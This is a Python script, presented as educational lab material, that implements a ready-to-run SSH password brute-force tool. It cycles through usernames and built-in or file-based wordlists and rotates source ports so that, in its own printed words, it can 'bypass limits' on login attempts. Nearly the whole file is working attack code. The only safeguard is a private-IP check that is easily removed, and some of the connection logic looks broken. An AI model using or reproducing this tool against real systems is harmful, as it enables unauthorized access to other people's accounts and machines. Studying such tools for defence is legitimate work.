#!/usr/bin/env python3
"""
Smart SSH Brute Force with port and user rotation
WARNING: For use only in your own laboratory environment!

Author: Educational material for cybersecurity learning
License: Educational purposes only
"""

import paramiko
import sys
import time
import threading
import argparse
import socket
import random
from concurrent.futures import ThreadPoolExecutor, as_completed

class SmartSSHBruteforce:
    """
    Smart SSH Brute Force with port and user rotation
    """
    
    def __init__(self, target_ip, target_port=22):
        self.target_ip = target_ip
        self.target_port = target_port
        self.found_credentials = []
        self.attempts = 0
        self.timeout = 10
        self.delay_between_attempts = 0.5
        self.attempts_per_port = 10  # Number of attempts per port
        self.port_rotation_delay = 0.5  # Delay when changing port
        self.source_ports = []
        self.current_port_index = 0
        
        # Security check
        if not self._is_safe_target(target_ip):
            print("❌ ERROR: SSH attacks are only allowed for local networks!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """Security target check"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def generate_source_ports(self, count=100):
        """
        Generate random ports for connection
        """
        min_port = 1024
        max_port = 65535
        
        ports = []
        for _ in range(count):
            port = random.randint(min_port, max_port)
            if port not in ports:
                ports.append(port)
        
        self.source_ports = ports
        print(f"✅ Generated {len(ports)} ports for connection")
        return ports
    
    def get_next_source_port(self):
        """
        Get next port for connection
        """
        if not self.source_ports:
            self.generate_source_ports()
        
        port = self.source_ports[self.current_port_index % len(self.source_ports)]
        self.current_port_index += 1
        
        # If all ports are exhausted, generate new ones
        if self.current_port_index >= len(self.source_ports):
            print("🔄 Generating new ports...")
            self.generate_source_ports()
            self.current_port_index = 0
        
        return port
    
    def test_ssh_connection(self, username, password, source_port=None):
        """
        Test SSH connection with given credentials
        """
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if source_port:
                # Try to use source port (may not work on all systems)
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.bind(('', source_port))
                    
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False,
                        sock=sock
                    )
                    sock.close()
                except (OSError, socket.error):
                    # If can't bind to port, use regular connection
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False
                    )
            else:
                # Regular connection
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # If we got here, connection is successful
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Authentication failed" in str(e) or "No existing session" in str(e):
                return False
            else:
                return False
        except Exception as e:
            return False
    
    def brute_force_with_port_rotation(self, usernames, password_list):
        """
        Smart brute force attack with port and user rotation
        """
        print(f"🧠 Smart SSH Brute Force attack on {self.target_ip}:{self.target_port}")
        print(f"👥 Users: {', '.join(usernames)}")
        print(f"📁 Password dictionary: {len(password_list)} passwords")
        print(f"🔄 Attempts per port: {self.attempts_per_port}")
        print(f"⏳ Port rotation delay: {self.port_rotation_delay} sec")
        print(f"⏱️  Timeout: {self.timeout} seconds")
        
        start_time = time.time()
        cycle_count = 0
        
        # Check SSH availability
        print("\n🔍 Checking SSH availability...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("❌ SSH unavailable on port 22")
                return False
            else:
                print("✅ SSH available")
        except Exception as e:
            print(f"⚠️  SSH check error: {e}")
        
        print(f"\n🚀 Starting smart brute force attack...")
        print("💡 Press Ctrl+C to stop")
        
        try:
            while True:
                cycle_count += 1
                print(f"\n🔄 Cycle {cycle_count}: Attacking {len(usernames)} users...")
                
                # For each user
                for username in usernames:
                    print(f"\n👤 Attacking user: {username}")
                    
                    # Generate new port for this user
                    current_source_port = self.get_next_source_port()
                    print(f"🔀 Using port: {current_source_port}")
                    
                    # Try passwords with limit per port
                    attempts_on_current_port = 0
                    
                    for password in password_list:
                        if attempts_on_current_port >= self.attempts_per_port:
                            print(f"⏸️  Reached limit ({self.attempts_per_port}) for port {current_source_port}")
                            print(f"⏳ Pause {self.port_rotation_delay} sec before port change...")
                            time.sleep(self.port_rotation_delay)
                            
                            # Generate new port
                            current_source_port = self.get_next_source_port()
                            print(f"🔀 Switching to port: {current_source_port}")
                            attempts_on_current_port = 0
                        
                        self.attempts += 1
                        attempts_on_current_port += 1
                        
                        # Show progress every 5 attempts
                        if self.attempts % 5 == 0:
                            elapsed_time = time.time() - start_time
                            speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
                            print(f"📊 Attempt {self.attempts}: {username}:{password} | Port: {current_source_port} | Speed: {speed:.2f} attempts/sec")
                        
                        # Try to connect
                        if self.test_ssh_connection(username, password, current_source_port):
                            print(f"🎉 SUCCESS! Found password: {username}:{password}")
                            self.found_credentials.append((username, password))
                            return True
                        
                        # Delay between attempts
                        time.sleep(self.delay_between_attempts)
                
                print(f"✅ Completed cycle {cycle_count} for all users. Starting new cycle...")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n🛑 Attack interrupted by user")
            return False
        except Exception as e:
            print(f"❌ Error: {e}")
            return False
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n📊 Brute force results:")
        print(f"  • Execution time: {duration:.2f} seconds")
        print(f"  • Total attempts: {self.attempts}")
        print(f"  • Completed cycles: {cycle_count}")
        print(f"  • Speed: {self.attempts/duration:.2f} attempts/sec")
        
        if self.found_credentials:
            print(f"  • Found accounts: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    🎉 {username}:{password}")
            return True
        else:
            print(f"  • Result: Password not found")
            return False
    
    def load_password_list(self, filename):
        """
        Load password list from file
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"✅ Loaded {len(passwords)} passwords from {filename}")
            return passwords
        except Exception as e:
            print(f"❌ Error loading password file: {e}")
            return []
    
    def load_github_passwords(self):
        """
        Load popular passwords from GitHub
        """
        passwords = [
            # Kali Linux specific passwords
            'kali', 'toor', 'kali123', 'toor123', 'kali2024', 'kali2023',
            'kalilinux', 'kalilinux123', 'kalilinux2024',
            'root', 'root123', 'root2024', 'root2023',
            'admin', 'admin123', 'admin2024', 'admin2023',
            
            # Victor specific passwords
            'victor', 'victor123', 'victor2024', 'victor2023',
            'Victor', 'Victor123', 'Victor2024', 'Victor2023',
            'VICTOR', 'VICTOR123', 'VICTOR2024', 'VICTOR2023',
            
            # Popular passwords
            'password', '123456', 'admin', 'root', 'user', 'test', 'hello',
            'password123', 'admin123', 'root123', 'user123',
            'password1', 'admin1', 'root1', 'user1',
            'password!', 'admin!', 'root!', 'user!',
            'password@', 'admin@', 'root@', 'user@',
            'password#', 'admin#', 'root#', 'user#',
            
            # Simple passwords
            '123', '1234', '12345', '123456', '1234567',
            'pass', 'Pass', 'PASS', 'pass123', 'Pass123', 'PASS123',
            'test', 'Test', 'TEST', 'test123', 'Test123', 'TEST123',
            'user', 'User', 'USER', 'user123', 'User123', 'USER123',
            
            # Empty and minimal
            '', '1', '12', '123', '1234', '12345',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            'q', 'qq', 'qqq', 'qqqq', 'qqqqq',
            'z', 'zz', 'zzz', 'zzzz', 'zzzzz'
        ]
        
        print(f"✅ Loaded {len(passwords)} popular passwords")
        return passwords

def main():
    """
    Main function of smart SSH attack tool
    """
    print("=" * 60)
    print("🧠 SMART SSH ATTACK TOOL")
    print("=" * 60)
    print("⚠️  WARNING: For use only in your own laboratory!")
    print("⚠️  Using against other systems is ILLEGAL!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Smart SSH attack tool')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-u', '--usernames', default='root,kali,victor,admin', help='Users to attack (comma separated)')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port')
    parser.add_argument('-w', '--wordlist', help='Password dictionary file')
    parser.add_argument('--attempts-per-port', type=int, default=10, help='Number of attempts per port')
    parser.add_argument('--port-rotation-delay', type=float, default=0.5, help='Delay when changing port')
    parser.add_argument('--timeout', type=int, default=10, help='SSH connection timeout')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between attempts')
    parser.add_argument('--github-passwords', action='store_true', help='Use popular passwords from GitHub')
    parser.add_argument('--port-count', type=int, default=100, help='Number of ports to generate')
    
    args = parser.parse_args()
    
    # Create tool instance
    ssh_attack = SmartSSHBruteforce(args.target, args.port)
    ssh_attack.timeout = args.timeout
    ssh_attack.delay_between_attempts = args.delay
    ssh_attack.attempts_per_port = args.attempts_per_port
    ssh_attack.port_rotation_delay = args.port_rotation_delay
    
    # Generate ports
    ssh_attack.generate_source_ports(args.port_count)
    
    # Load passwords
    if args.github_passwords:
        passwords = ssh_attack.load_github_passwords()
    elif args.wordlist:
        passwords = ssh_attack.load_password_list(args.wordlist)
    else:
        # Use built-in list
        passwords = [
            'victor', 'Victor', 'VICTOR', 'victor123', 'Victor123', 'VICTOR123',
            'victor1', 'Victor1', 'VICTOR1', 'victor1234', 'Victor1234', 'VICTOR1234',
            'victor!', 'Victor!', 'VICTOR!', 'victor@', 'Victor@', 'VICTOR@',
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123', 'toor', 'toor123'
        ]
    
    if not passwords:
        print("❌ No passwords for testing")
        return
    
    # Determine users to attack
    usernames = [u.strip() for u in args.usernames.split(',')]
    
    try:
        # Run smart brute force attack
        success = ssh_attack.brute_force_with_port_rotation(usernames, passwords)
        
        if success:
            print("\n🎉 ATTACK SUCCESSFUL!")
            print("💡 Security recommendations:")
            print("  • Use strong passwords")
            print("  • Enable two-factor authentication")
            print("  • Configure fail2ban to block IPs")
            print("  • Use SSH keys instead of passwords")
            print("  • Limit login attempts")
        else:
            print("\n❌ ATTACK UNSUCCESSFUL")
            print("✅ System protected against brute force attacks")
            
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    print("\n📚 Educational information:")
    print("• Smart SSH brute force with port rotation")
    print("• Attack multiple users simultaneously")
    print("• Limit attempts per port to bypass limits")
    print("• Protection: strong passwords + fail2ban + 2FA")

if __name__ == "__main__":
    main()
